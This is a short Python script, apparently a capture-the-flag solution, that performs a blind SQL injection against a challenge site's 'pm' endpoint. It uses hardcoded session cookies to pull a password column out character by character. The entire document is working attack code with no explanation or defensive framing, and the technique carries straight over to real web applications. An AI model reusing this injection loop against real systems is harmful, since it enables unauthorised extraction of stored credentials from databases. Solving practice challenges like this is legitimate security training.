import requests
import sys
url = "http://chall.tasteless.eu/level4/index.php?action=pm&id="
payload=""
cook = {"PHPSESSID":"puf7hprh76ko5s49ealg0jfuf2","login":"guest%25084e0343a0486ff05530df6c705c8bb4"}
session = requests.Session()
for i in range(1,100):
    for j in range(32,127):
        payload="1 and substring((select group_concat(pass) from level4),%d,1)=BINARY '%s'"%(int(i),chr(j))
        #print payload
        r = session.get(url+payload,cookies=cook)
        #print r.content
        if "admin" in r.content:
            sys.stdout.write(chr(j));break